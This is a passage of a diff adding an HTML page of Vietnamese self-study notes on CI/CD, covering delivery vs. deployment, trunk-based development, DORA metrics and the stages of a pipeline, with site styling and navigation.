@@ -1,0 +1,1425 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>CI/CD và Release notes · Trác Việt</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --blue:#0972d3; --blue-d:#075aa6; --navbg:#232f3e;
+  --bg:#ffffff; --side:#fafbfc; --ink:#202124; --muted:#5f6368; --line:#e1e4e8;
+  --link:#0972d3; --code:#f3f5f8; --codeink:#1f2933;
+  --note:#e8f0fe; --note-b:#326ce5; --tip:#e6f4ea; --tip-b:#1e8e3e; --warn:#fff4e5; --warn-b:#e37400;
+  --font:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",Arial,sans-serif;
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --navbg:#161e2a; --bg:#0f141b; --side:#0f141b; --ink:#e4e8ee; --muted:#9aa5b1; --line:#252f3c;
+    --link:#8ab0ff; --code:#171f2a; --codeink:#dbe4ee;
+    --note:#14233f; --note-b:#5b8cf0; --tip:#10261a; --tip-b:#3fb860; --warn:#2b200f; --warn-b:#f0a03c; color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --navbg:#161e2a; --bg:#0f141b; --side:#0f141b; --ink:#e4e8ee; --muted:#9aa5b1; --line:#252f3c;
+  --link:#8ab0ff; --code:#171f2a; --codeink:#dbe4ee;
+  --note:#14233f; --note-b:#5b8cf0; --tip:#10261a; --tip-b:#3fb860; --warn:#2b200f; --warn-b:#f0a03c; color-scheme:dark;
+}
+html{height:100%;scroll-padding-top:calc(env(safe-area-inset-top,0px) + 72px)}
+*{box-sizing:border-box}
+body{margin:0;min-height:100%;background:var(--bg);color:var(--ink);font-family:var(--font);font-size:16px;line-height:1.65}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:var(--navbg);z-index:40}
+a{color:var(--link)}
+:focus-visible{outline:2px solid var(--blue);outline-offset:2px;border-radius:3px}
+
+/* navbar */
+.nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:30;height:56px;background:var(--navbg);color:#fff;
+  display:flex;align-items:center;gap:18px;padding:0 20px}
+.brand{display:flex;align-items:center;gap:10px;color:#fff;text-decoration:none;font-weight:500;font-size:18px;white-space:nowrap}
+.brand svg{width:34px;height:34px;flex:none}
+.nav .links{display:flex;gap:18px;font-size:14px}
+.nav .links a{color:#fff;text-decoration:none;opacity:.9}
+.nav .links a:hover{opacity:1;text-decoration:underline}
+.nav .sp{flex:1}
+.search{position:relative;width:260px;max-width:40vw}
+.search input{width:100%;height:34px;border:0;border-radius:4px;padding:0 12px;font:inherit;font-size:14px;
+  background:rgba(255,255,255,.18);color:#fff}
+.search input::placeholder{color:rgba(255,255,255,.8)}
+.search input:focus{background:#fff;color:#202124;outline:2px solid #fff}
+.search input:focus::placeholder{color:#6b7280}
+.ibtn{background:transparent;border:1px solid rgba(255,255,255,.45);color:#fff;border-radius:4px;height:32px;padding:0 10px;
+  font:inherit;font-size:13px;cursor:pointer}
+.ibtn:hover{background:rgba(255,255,255,.14)}
+#burger{display:none;font-size:18px;padding:0 10px}
+
+/* layout */
+.shell{display:grid;grid-template-columns:290px minmax(0,1fr) 240px;max-width:1500px;margin:0 auto}
+aside#side{position:sticky;top:calc(56px + env(safe-area-inset-top,0px));align-self:start;
+  height:calc(100vh - 56px - env(safe-area-inset-top,0px));overflow-y:auto;background:var(--side);
+  border-right:1px solid var(--line);padding:16px 12px 40px}
+.prog{font-size:13px;color:var(--muted);margin:0 8px 12px}
+.prog i{display:block;height:4px;background:var(--line);border-radius:2px;margin-top:6px;overflow:hidden}
+.prog i b{display:block;height:100%;background:var(--blue);width:0}
+.grp h3{font-size:12px;font-weight:700;color:var(--muted);margin:16px 8px 4px;letter-spacing:.02em}
+#side a{display:flex;align-items:center;gap:8px;padding:6px 10px;border-radius:4px;color:var(--ink);text-decoration:none;font-size:14px;line-height:1.35}
+#side a:hover{background:var(--code)}
+#side a.on{color:var(--blue);background:var(--note);font-weight:500}
+#side a.read::after{content:"✓";margin-left:auto;color:var(--tip-b);font-size:12px}
+.none{display:none;margin:16px 8px;font-size:14px;color:var(--muted)}
+#side a.by{margin:24px 4px 0;padding:10px 12px;border:1px solid var(--line);border-radius:8px;gap:10px;color:var(--ink)}
+#side a.by:hover{border-color:var(--blue);background:transparent}
+#side a.by span{display:flex;flex-direction:column;line-height:1.25}
+#side a.by small{color:var(--muted);font-size:12px}
+
+main{padding:28px 44px 80px;min-width:0}
+.crumb{font-size:13px;color:var(--muted);margin-bottom:6px}
+.page h1{font-size:34px;font-weight:500;line-height:1.2;margin:0 0 14px}
+.lead{font-size:18px;color:var(--muted);margin:0 0 8px;max-width:70ch}
+.page h2{font-size:24px;font-weight:500;margin:40px 0 10px;padding-bottom:6px;border-bottom:1px solid var(--line)}
+.page h3{font-size:18px;font-weight:500;margin:26px 0 6px}
+.page p,.page li{max-width:76ch}
+.page ul,.page ol{padding-left:24px}
+.page li{margin:3px 0}
+code{font-family:var(--mono);font-size:.86em;background:var(--code);color:var(--codeink);padding:2px 5px;border-radius:3px}
+pre{position:relative;background:var(--code);border:1px solid var(--line);border-radius:6px;padding:14px 16px;overflow-x:auto;margin:14px 0;line-height:1.5}
+pre code{background:none;padding:0;font-size:13px;white-space:pre}
+.copy{position:absolute;top:6px;right:6px;font:inherit;font-size:12px;background:var(--bg);color:var(--muted);border:1px solid var(--line);
+  border-radius:4px;padding:2px 8px;cursor:pointer}
+.copy:hover{color:var(--ink)}
+.tw{overflow-x:auto;margin:14px 0}
+table{border-collapse:collapse;width:100%;font-size:14.5px;min-width:520px}
+th,td{border:1px solid var(--line);padding:8px 12px;text-align:left;vertical-align:top}
+th{background:var(--code);font-weight:500}
+.callout{border-left:4px solid var(--note-b);background:var(--note);padding:10px 16px;margin:18px 0;border-radius:0 6px 6px 0;max-width:76ch}
+.callout p{margin:4px 0}
+.callout>b:first-child{display:block;margin-bottom:2px}
+.callout.tip{background:var(--tip);border-color:var(--tip-b)}
+.callout.warn{background:var(--warn);border-color:var(--warn-b)}
+.dg{width:100%;height:auto;margin:16px 0;border:1px solid var(--line);border-radius:6px;background:var(--bg)}
+.dg .box{fill:var(--bg);stroke:var(--blue);stroke-width:1.5}
+.dg .zone{fill:var(--code);stroke:var(--line);stroke-width:1.5}
+.dg .pod{fill:var(--note);stroke:var(--note-b);stroke-width:1}
+.dg text{fill:var(--ink);font-family:var(--font);font-size:13px}
+.dg .zt{font-weight:700;font-size:13px}
+.dg .ln{stroke:var(--blue);stroke-width:1.5;fill:none}
+.dg .dash{stroke-dasharray:5 4}
+
+.mark{display:flex;align-items:center;gap:10px;margin:40px 0 0;padding-top:20px;border-top:1px solid var(--line)}
+.mark button{font:inherit;font-size:14px;border:1px solid var(--blue);color:var(--blue);background:transparent;border-radius:4px;padding:6px 14px;cursor:pointer}
+.mark button[aria-pressed="true"]{background:var(--blue);color:#fff}
+.pn{display:flex;justify-content:space-between;gap:12px;margin-top:20px}
+.pn a{display:block;border:1px solid var(--line);border-radius:6px;padding:10px 16px;text-decoration:none;color:var(--ink);max-width:48%}
+.pn a:hover{border-color:var(--blue)}
+.pn small{display:block;color:var(--muted);font-size:12px}
+.pn a:last-child{text-align:right;margin-left:auto}
+
+nav#toc{position:sticky;top:calc(56px + env(safe-area-inset-top,0px));align-self:start;
+  max-height:calc(100vh - 56px - env(safe-area-inset-top,0px));overflow-y:auto;padding:28px 16px 40px 0;font-size:13.5px}
+#toc h4{margin:0 0 8px;font-size:12px;color:var(--muted);font-weight:700}
+#toc a{display:block;padding:3px 0 3px 12px;border-left:2px solid var(--line);color:var(--muted);text-decoration:none;line-height:1.4}
+#toc a.l3{padding-left:26px}
+#toc a:hover{color:var(--ink)}
+#toc a.on{color:var(--blue);border-left-color:var(--blue);font-weight:500}
+footer{border-top:1px solid var(--line);margin-top:48px;padding-top:16px;font-size:13px;color:var(--muted)}
+#scrim{display:none}
+
+@media (max-width:1100px){.shell{grid-template-columns:270px minmax(0,1fr)}nav#toc{display:none}}
+@media (max-width:820px){
+  .shell{grid-template-columns:1fr}
+  .nav .links{display:none}
+  #burger{display:inline-block}
+  .brand span{font-size:16px}
+  aside#side{position:fixed;left:0;bottom:0;top:calc(56px + env(safe-area-inset-top,0px));height:auto;width:300px;max-width:86vw;z-index:25;
+    transform:translateX(-102%);transition:transform .2s}
+  aside#side.open{transform:none}
+  #scrim.open{display:block;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:20}
+  main{padding:20px 16px 64px}
+  .page h1{font-size:28px}
+  .search{width:auto;flex:1;max-width:none}
+  .sp{display:none}
+}
+@media (prefers-reduced-motion:reduce){aside#side{transition:none}}
+
+.nav{border-bottom:3px solid #2ea44f}
+.mk{background:#2ea44f;color:#06220f;font-family:var(--mono);font-weight:700;font-size:13px;padding:4px 8px;border-radius:4px;letter-spacing:.02em}
+.brand{gap:10px}
+/* quiz */
+.qsum{display:flex;flex-wrap:wrap;align-items:center;gap:10px 16px;margin:16px 0 8px;padding:12px 16px;border:1px solid var(--line);border-radius:8px;background:var(--code)}
+.qsum b{font-weight:500}.qsum button{font:inherit;font-size:13px;padding:4px 12px;border:1px solid var(--line);border-radius:4px;background:var(--bg);color:var(--ink);cursor:pointer;margin-left:auto}
+.qs{border:1px solid var(--line);border-radius:8px;padding:18px 20px;margin:16px 0;background:var(--bg)}
+.qs.right{border-color:var(--tip-b)}.qs.wrong{border-color:#d13212}
+.qn{margin:0 0 6px;font-size:13px;color:var(--muted);font-weight:500}
+.qt{margin:0 0 12px;max-width:80ch}
+.qo{list-style:none;margin:0 0 10px;padding:0}
+.qo li{margin:6px 0;max-width:80ch}
+.qo label{display:flex;gap:10px;align-items:flex-start;padding:8px 12px;border:1px solid var(--line);border-radius:6px;cursor:pointer}
+.qo label:hover{border-color:var(--blue)}
+.qo input{margin-top:5px;accent-color:var(--blue)}
+.qo li.ok label{border-color:var(--tip-b);background:var(--tip)}
+.qo li.bad label{border-color:#d13212;background:rgba(209,50,18,.1)}
+.qo li.miss label{border-color:var(--tip-b);border-style:dashed}
+.qh{margin:0 0 10px;font-size:13px;color:var(--muted)}
+.qb{font:inherit;font-size:14px;padding:7px 18px;border:0;border-radius:4px;background:var(--blue);color:#fff;cursor:pointer}
+.qb:disabled{opacity:.5;cursor:default}
+.qe{margin-top:14px;padding:12px 16px;border-left:4px solid var(--note-b);background:var(--note);border-radius:0 6px 6px 0;max-width:80ch}
+.qe b.v{display:block;margin-bottom:4px}
+
+/* ===== site theme ===== */
+:root{--blue:#1a7f4b;--blue-d:#0f6a3b;--onacc:#fff;--navbg:#13261d;--bg:#fcfcfd;--side:#f5f6f8;--ink:#1d2229;--muted:#5b6571;--line:#dfe2e7;
+  --link:#1a7f4b;--code:#eef0f3;--codeink:#1d2229;--note:#edf1f6;--note-b:#51647b;--tip:#e7f4ea;--tip-b:#1f8a3b;--warn:#fff1e0;--warn-b:#c25b00}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){--blue:#58d49a;--blue-d:#58d49a;--onacc:#06220f;--navbg:#0f1d17;--bg:#11151a;--side:#11151a;--ink:#e3e7ec;--muted:#98a3b0;--line:#252c35;
+    --link:#58d49a;--code:#1a2027;--codeink:#dde4ec;--note:#18212c;--note-b:#7f95b0;--tip:#102419;--tip-b:#46b866;--warn:#2a1d0c;--warn-b:#f0a03c}
+}
+:root[data-theme="dark"]{--blue:#58d49a;--blue-d:#58d49a;--onacc:#06220f;--navbg:#0f1d17;--bg:#11151a;--side:#11151a;--ink:#e3e7ec;--muted:#98a3b0;--line:#252c35;
+  --link:#58d49a;--code:#1a2027;--codeink:#dde4ec;--note:#18212c;--note-b:#7f95b0;--tip:#102419;--tip-b:#46b866;--warn:#2a1d0c;--warn-b:#f0a03c}
+:root[data-theme="light"]{--blue:#1a7f4b;--onacc:#fff}
+body{font-size:16px}
+.page h1{font-weight:600;letter-spacing:-.01em}
+.page h2{font-weight:600}
+.mark button[aria-pressed="true"],.qb{color:var(--onacc)}
+#side a.on{color:var(--link)}
+pre{background:#12171d;border-color:#28313c;color:#d6dde5}
+pre code{color:#d6dde5;font-size:13px}
+pre .ps{color:#2ea44f;user-select:none}
+pre .cm{color:#7f8c99}
+pre.ascii{line-height:1.25}
+pre.ascii code{font-size:12.5px}
+.copy{background:#1b222a;color:#9fb0c1;border-color:#2c3744}
+.copy:hover{color:#fff}
+.callout.lab{background:var(--code);border-color:var(--blue)}
+.callout.lab>b:first-child::before{content:"Lab · ";color:var(--blue)}
+.callout.lab pre{margin:10px 0}
+.qs.wrong{border-color:#c0392b}
+.page code{overflow-wrap:anywhere}
+.page pre code{overflow-wrap:normal}
+@media (max-width:560px){
+  .nav{gap:10px;padding:0 12px}
+  .brand>span:last-child{display:none}
+  .search input{min-width:0}
+  #theme{padding:0 8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+
+<header class="nav">
+  <button class="ibtn" id="burger" aria-label="Mở mục lục">☰</button>
+  <a class="brand" href="#overview" aria-label="CI/CD và Release notes"><span class="mk">ci/cd</span><span>CI/CD · Release <span style="font-weight:400;opacity:.85">notes</span></span></a>
+  <nav class="links" aria-label="Liên kết nhanh">
+    <a href="https://tracviethustcs.github.io/">← Trác Việt</a>
+    <a href="#cicd-principles">Khái niệm</a>
+    <a href="#pipeline-anatomy">Pipeline</a>
+    <a href="#gha">GitHub Actions</a>
+    <a href="#deploy-strategies">Phát hành</a>
+    <a href="#gitops-cd">GitOps</a>
+    <a href="#quiz-ci">Luyện tập</a>
+  </nav>
+  <span class="sp"></span>
+  <div class="search"><input id="q" type="search" placeholder="Tìm trong ghi chú  ( / )" aria-label="Tìm trong ghi chú"></div>
+  <button class="ibtn" id="theme" aria-label="Đổi giao diện sáng/tối">Sáng/Tối</button>
+</header>
+<div id="scrim"></div>
+
+<div class="shell">
+  <aside id="side" aria-label="Mục lục">
+    <a href="https://tracviethustcs.github.io/" style="margin:0 0 10px;font-weight:500;color:var(--blue)">← Tất cả tài liệu</a>
+    <div class="prog"><span id="progtxt"></span><i><b id="progbar"></b></i></div>
+    <div id="side-links"></div>
+    <p class="none" id="none">Không có trang nào khớp từ khóa.</p>
+    <a class="by" href="https://github.com/TracVietHustCS" target="_blank" rel="noopener">
+      <svg viewBox="0 0 16 16" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82a7.5 7.5 0 0 1 4 0c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
+      <span><b>TracViet</b><small>@TracVietHustCS</small></span>
+    </a>
+  </aside>
+
+  <main id="main">
+
+<!-- ============ OVERVIEW ============ -->
+<article class="page" data-id="overview" data-group="Bắt đầu" data-title="Tổng quan và cách học" hidden>
+<h1>Tổng quan và cách học</h1>
+<p class="lead">Bộ ghi chú về CI/CD và phát hành phần mềm: từ nguyên tắc, giải phẫu một pipeline, GitHub Actions và GitLab CI, kiểm thử, artifact, bảo mật pipeline, đến chiến lược phát hành, GitOps, migration database, rollback và đo lường bằng DORA.</p>
+<div class="callout warn"><b>Đọc trước khi dùng</b><p>Đây là ghi chú <b>tự học, tự soạn</b>, không phải tài liệu chính thức của GitHub, GitLab hay bất kỳ nhà cung cấp nào. Cú pháp workflow, tên và phiên bản action, tính năng của nền tảng thay đổi nhanh. Ghi chú không tra cứu trực tuyến nên có thể lỗi thời: hãy đối chiếu tài liệu hiện hành, thử trên repo thử nghiệm, và ghim phiên bản các thành phần bạn dùng. Pipeline có quyền triển khai: đừng đưa nó vào production nếu bạn chưa kiểm soát được ai và cái gì chạy được trong đó.</p></div>
+<h2>Bạn sẽ làm được gì sau khi học xong</h2>
+<ul><li>Phân biệt Continuous Integration, Continuous Delivery và Continuous Deployment, và giải thích vì sao tổ chức chọn mức nào.</li><li>Thiết kế pipeline gọn: build một lần, kiểm thử theo tầng, quét bảo mật, đóng gói, triển khai lặp lại được.</li><li>Viết workflow GitHub Actions và <code>.gitlab-ci.yml</code> có cache, matrix, môi trường và duyệt thủ công.</li><li>Chọn chiến lược phát hành (rolling, blue-green, canary), kèm cờ tính năng và cổng kiểm tra bằng số đo.</li><li>Xử lý thay đổi database an toàn, quay lui khi sự cố, và đo hiệu quả bằng các chỉ số DORA.</li></ul>
+<h2>Cấu trúc</h2>
+<div class="tw"><table><tr><th>Nhóm</th><th>Trang</th><th>Nội dung</th></tr><tr><td>Khái niệm</td><td><a href="#cicd-principles">Nguyên tắc CI/CD</a></td><td>Định nghĩa, trunk-based, DORA</td></tr><tr><td>Pipeline</td><td><a href="#pipeline-anatomy">Giải phẫu pipeline</a>, <a href="#gha">GitHub Actions</a>, <a href="#gitlab-others">GitLab CI và công cụ khác</a>, <a href="#testing-strategy">Chiến lược kiểm thử</a>, <a href="#artifacts">Artifact và phiên bản</a></td><td>Xây pipeline</td></tr><tr><td>An toàn</td><td><a href="#pipeline-security">Bảo mật pipeline</a>, <a href="#secrets-oidc">Bí mật và OIDC</a></td><td>Giảm rủi ro chuỗi cung ứng</td></tr><tr><td>Phát hành</td><td><a href="#environments">Môi trường</a>, <a href="#deploy-strategies">Chiến lược phát hành</a>, <a href="#progressive-delivery">Progressive delivery</a>, <a href="#gitops-cd">GitOps</a>, <a href="#db-migrations">Migration database</a>, <a href="#rollback">Rollback</a></td><td>Đưa thay đổi lên production</td></tr><tr><td>Vận hành</td><td><a href="#metrics-dora">DORA và đo lường</a>, <a href="#pipeline-ops">Hiệu năng và sự cố pipeline</a></td><td>Cải thiện liên tục</td></tr><tr><td>Tham chiếu</td><td><a href="#reference-pipelines">Pipeline mẫu hoàn chỉnh</a>, <a href="#cicd-cheatsheet">Cheat sheet</a>, <a href="#quiz-ci">Luyện tập 1</a>, <a href="#quiz-cd">Luyện tập 2</a></td><td>Tra nhanh và tự kiểm tra</td></tr></table></div>
+<h2>Môi trường thực hành</h2>
+<p>Bạn chỉ cần một tài khoản GitHub (hoặc GitLab) miễn phí và một repo thử nghiệm nhỏ có vài bài kiểm thử. Với phần triển khai, có thể dùng cụm Kubernetes cục bộ (<code>kind</code>) hoặc một VM thử.</p>
+<pre><code>git --version
+docker --version
+gh --version        # GitHub CLI (tuỳ chọn)</code></pre>
+<p>Công cụ bổ trợ hay dùng: <code>act</code> (chạy thử workflow GitHub Actions trên máy), <code>actionlint</code> (kiểm tra cú pháp workflow), <code>yamllint</code>.</p>
+<h2>Liên quan tới các ghi chú khác</h2>
+<p>Pipeline thường build và chạy <a href="https://tracviethustcs.github.io/docker-container-notes/" target="_blank" rel="noopener">Docker</a>, triển khai hạ tầng bằng <a href="https://tracviethustcs.github.io/iac-terraform-ansible-notes/" target="_blank" rel="noopener">Terraform và Ansible</a> và đưa ứng dụng lên <a href="https://tracviethustcs.github.io/k8s-study-notes/" target="_blank" rel="noopener">Kubernetes</a> bằng GitOps. Phần chuỗi cung ứng image (quét, SBOM, ký) có ở <a href="https://tracviethustcs.github.io/k8s-study-notes/#adv-supply-chain" target="_blank" rel="noopener">Bảo mật chuỗi cung ứng image</a>.</p>
+</article>
+<article class="page" data-id="cicd-principles" data-group="Khái niệm" data-title="Nguyên tắc CI/CD, trunk-based và DORA" hidden>
+<h1>Nguyên tắc CI/CD, trunk-based và DORA</h1>
+<p class="lead">CI/CD không phải là công cụ mà là cách làm việc: tích hợp thường xuyên, luôn có thể phát hành, và đưa thay đổi nhỏ lên production liên tục. Công cụ chỉ tự động hoá thực hành đó.</p>
+<h2>Ba khái niệm hay bị lẫn</h2>
+<div class="tw"><table><tr><th></th><th>Continuous Integration (CI)</th><th>Continuous Delivery</th><th>Continuous Deployment</th></tr><tr><td>Ý nghĩa</td><td>Mọi thay đổi được <b>tích hợp</b> vào nhánh chính thường xuyên (ít nhất mỗi ngày) và được <b>build, kiểm thử tự động</b></td><td>Mọi thay đổi đã qua pipeline đều <b>sẵn sàng phát hành</b> bất kỳ lúc nào; việc phát hành lên production là <b>quyết định của con người</b> (một cú nhấp)</td><td>Mọi thay đổi qua pipeline được <b>tự động đưa lên production</b>, không cần duyệt thủ công</td></tr><tr><td>Mục tiêu</td><td>Phát hiện lỗi tích hợp sớm</td><td>Giảm rủi ro và công sức của việc phát hành</td><td>Tốc độ tối đa, vòng phản hồi ngắn nhất</td></tr><tr><td>Điều kiện</td><td>Kiểm thử tự động đáng tin cậy</td><td>CI tốt, triển khai tự động hoá hoàn toàn</td><td>Kiểm thử, giám sát và rollback đủ tốt để tin tưởng</td></tr></table></div>
+<p>"CD" có thể là Delivery hoặc Deployment tuỳ ngữ cảnh: hãy hỏi lại. Phần lớn tổ chức bắt đầu ở Continuous Delivery và chỉ tiến tới Deployment cho những dịch vụ có đủ độ tin cậy.</p>
+<h2>Nguyên tắc cốt lõi</h2>
+<ol><li><b>Tích hợp thường xuyên, thay đổi nhỏ.</b> Thay đổi nhỏ dễ review, dễ kiểm thử, dễ tìm nguyên nhân khi hỏng và dễ quay lui.</li><li><b>Một nguồn sự thật</b>: mã, cấu hình và định nghĩa pipeline đều nằm trong Git (pipeline as code).</li><li><b>Build một lần, triển khai nhiều nơi.</b> Artifact được tạo một lần rồi đi qua các môi trường; không build lại cho từng môi trường (<a href="#artifacts">Artifact</a>).</li><li><b>Pipeline nhanh và đáng tin cậy.</b> Pipeline chậm hoặc hay lỗi ngẫu nhiên khiến người ta bỏ qua nó. Mục tiêu thường là vài phút cho phản hồi đầu tiên.</li><li><b>Hỏng thì sửa ngay.</b> Nhánh chính luôn xanh; build đỏ là việc ưu tiên số một của cả nhóm.</li><li><b>Tự động hoá mọi thứ lặp lại</b>, gồm cả triển khai và quay lui.</li><li><b>Dịch chuyển trái (shift-left)</b>: kiểm thử và bảo mật ở giai đoạn càng sớm càng rẻ.</li><li><b>Có thể quan sát và quay lui</b>: biết bản nào đang chạy, và quay về bản trước dễ dàng (<a href="#rollback">Rollback</a>).</li></ol>
+<h2>Phát triển trên nhánh chính (trunk-based)</h2>
+<p>CI chỉ thật sự có nghĩa khi mọi người tích hợp thường xuyên. Nhánh tính năng sống nhiều ngày là "tích hợp trì hoãn": xung đột và lỗi dồn lại tới lúc merge.</p>
+<div class="tw"><table><tr><th></th><th>Trunk-based</th><th>Nhánh tính năng dài hạn (GitFlow)</th></tr><tr><td>Nhánh</td><td>Nhánh chính duy nhất; nhánh ngắn (dưới 1 đến 2 ngày) hoặc commit thẳng</td><td>Nhiều nhánh <code>develop</code>, <code>release</code>, <code>feature</code> sống lâu</td></tr><tr><td>Tích hợp</td><td>Liên tục</td><td>Dồn lại tới lúc merge</td></tr><tr><td>Phát hành</td><td>Từ nhánh chính (kèm cờ tính năng để ẩn việc chưa xong)</td><td>Theo nhánh release</td></tr><tr><td>Hợp với</td><td>CI/CD thường xuyên, dịch vụ web</td><td>Phần mềm đóng gói phát hành theo phiên bản dài hạn</td></tr></table></div>
+<p>Việc chưa hoàn thành được <b>ẩn sau cờ tính năng</b> (feature flag) để vẫn merge được mã vào nhánh chính mà không bật cho người dùng (<a href="#deploy-strategies">Chiến lược phát hành</a>).</p>
+<h2>Đo hiệu quả: bốn chỉ số DORA</h2>
+<p>Nghiên cứu DORA tìm ra bốn chỉ số liên quan chặt tới hiệu quả của nhóm phát triển:</p>
+<div class="tw"><table><tr><th>Chỉ số</th><th>Đo gì</th><th>Nhóm</th></tr><tr><td><b>Deployment frequency</b></td><td>Bao lâu triển khai lên production một lần</td><td>Tốc độ</td></tr><tr><td><b>Lead time for changes</b></td><td>Từ commit đến chạy trên production mất bao lâu</td><td>Tốc độ</td></tr><tr><td><b>Change failure rate</b></td><td>Tỷ lệ triển khai gây sự cố cần khắc phục</td><td>Ổn định</td></tr><tr><td><b>Time to restore service</b></td><td>Mất bao lâu để khôi phục khi có sự cố (các báo cáo mới gọi là thời gian phục hồi sau triển khai lỗi)</td><td>Ổn định</td></tr></table></div>
+<p>Điểm đáng chú ý của nghiên cứu: <b>tốc độ và ổn định đi cùng nhau</b>, không đánh đổi nhau; nhóm triển khai thường xuyên với thay đổi nhỏ lại ít sự cố hơn. Chi tiết cách đo ở <a href="#metrics-dora">DORA và đo lường</a>. Tên chỉ số và cách phân hạng thay đổi theo từng báo cáo hằng năm: hãy xem báo cáo hiện hành.</p>
+<h2>Những hiểu lầm hay gặp</h2>
+<ul><li>"CI/CD là cài Jenkins hoặc GitHub Actions": công cụ chỉ là phần nhỏ; không có kiểm thử tự động tốt và thói quen tích hợp thường xuyên thì pipeline chỉ chạy nhanh những thứ vô nghĩa.</li><li>"Triển khai thường xuyên thì rủi ro hơn": ngược lại, thay đổi nhỏ và thường xuyên giảm rủi ro mỗi lần. Rủi ro lớn nằm ở bản phát hành to, hiếm.</li><li>"Cần 100% tự động mới là CI/CD": Continuous Delivery với một bước duyệt thủ công vẫn là CD hợp lệ.</li></ul>
+<div class="callout lab"><b>Đánh giá nhanh quy trình hiện tại của bạn</b><p>Chọn một repo bạn làm việc và trả lời bằng số liệu thực:</p>
+<ol><li>Nhánh chính có luôn xanh không? Lần gần nhất nó đỏ là khi nào, và mất bao lâu để sửa?</li><li>Từ lúc bạn commit đến lúc thay đổi đó chạy trên production mất bao lâu (lead time)?</li><li>Bao lâu triển khai một lần? Mỗi lần triển khai là thay đổi nhỏ hay dồn lại?</li><li>Triển khai gần nhất có cần ai làm tay không? Bao nhiêu bước?</li><li>Nếu bản vừa triển khai hỏng, quay lui mất bao lâu và bằng cách nào?</li></ol>
+<p>Ghi các câu trả lời lại: đó là đường cơ sở để so sánh sau khi cải thiện pipeline.</p></div>
+</article>
+<article class="page" data-id="pipeline-anatomy" data-group="Pipeline" data-title="Giải phẫu một pipeline" hidden>
+<h1>Giải phẫu một pipeline</h1>
+<p class="lead">Pipeline là chuỗi bước tự động đưa thay đổi từ commit tới production. Các nền tảng khác nhau về cú pháp nhưng giống nhau về cấu trúc.</p>
+<h2>Các giai đoạn điển hình</h2>
+<pre class="ascii"><code> commit/PR  --&gt;  CHECKOUT  --&gt;  BUILD  --&gt;  TEST  --&gt;  SCAN  --&gt;  PACKAGE  --&gt;  PUBLISH  --&gt;  DEPLOY  --&gt;  VERIFY
+                                  |           |          |           |             |            |           |
+                              biên dịch   unit, tích   SAST, SCA,  image,        đẩy lên      dev -&gt; stg   smoke test,
+                              phụ thuộc   hợp, lint    secret scan  gói          registry/    -&gt; prod      giám sát,
+                                                                                  repo artifact             rollback</code></pre>
+<div class="tw"><table><tr><th>Giai đoạn</th><th>Làm gì</th><th>Phản hồi nhanh?</th></tr><tr><td>Lint, kiểm tra tĩnh</td><td>Định dạng, phong cách, lỗi cú pháp</td><td>Rất nhanh, chạy đầu tiên</td></tr><tr><td>Build</td><td>Biên dịch, cài phụ thuộc, tạo sản phẩm</td><td>Nhanh nhờ cache</td></tr><tr><td>Kiểm thử đơn vị</td><td>Kiểm thử logic từng phần</td><td>Nhanh</td></tr><tr><td>Kiểm thử tích hợp</td><td>Kiểm thử với database, dịch vụ phụ thuộc</td><td>Chậm hơn</td></tr><tr><td>Quét bảo mật</td><td>Mã (SAST), thư viện (SCA), bí mật, image, IaC</td><td>Song song với test</td></tr><tr><td>Đóng gói</td><td>Tạo artifact bất biến (image, gói)</td><td></td></tr><tr><td>Xuất bản</td><td>Đẩy artifact lên registry/kho, kèm metadata</td><td></td></tr><tr><td>Triển khai</td><td>Đưa artifact lên môi trường</td><td>Có thể cần duyệt</td></tr><tr><td>Xác minh</td><td>Smoke test, kiểm tra sức khoẻ, đo chỉ số</td><td>Quyết định giữ hay quay lui</td></tr></table></div>
+<p>Nguyên tắc thiết kế: <b>chạy thứ rẻ và nhanh trước</b> (lint, unit test) để lỗi lộ ra sớm, thứ đắt và chậm sau; <b>song song hoá</b> những việc độc lập; <b>dừng sớm</b> khi một giai đoạn quan trọng thất bại.</p>
+<h2>Khái niệm chung của mọi nền tảng</h2>
